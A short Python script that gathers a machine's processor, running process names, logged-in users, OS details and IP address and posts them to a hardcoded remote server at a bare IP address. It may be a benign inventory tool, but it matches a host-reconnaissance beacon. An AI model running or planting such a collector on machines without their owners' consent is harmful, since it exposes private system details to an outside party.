import psutil
import platform
import requests
import socket


def get_processor_info():
    return platform.processor()

def get_running_processes():
    return [p.name() for p in psutil.process_iter(['name'])]

def get_logged_in_users():
    return [user.name for user in psutil.users()]

def get_os_name():
    return platform.system()

def get_os_version():
    return platform.version()

def collect_info():
    return {
        "processor": get_processor_info(),
        "processes": get_running_processes(),
        "users": get_logged_in_users(),
        "os_name": get_os_name(),
        "os_version": get_os_version(),
        "ip_address": socket.gethostbyname(socket.gethostname())
    }

def send_info(api_url):
    info = collect_info()
    response = requests.post(f"{api_url}/submit", json=info)
    if response.status_code == 200:
        print("Information sent successfully")
    else:
        print(f"Failed to send information. Status code: {response.status_code}")

if __name__ == "__main__":  # Este bloque debe estar alineado
    API_URL = "http://3.88.188.106:5000"
    send_info(API_URL)

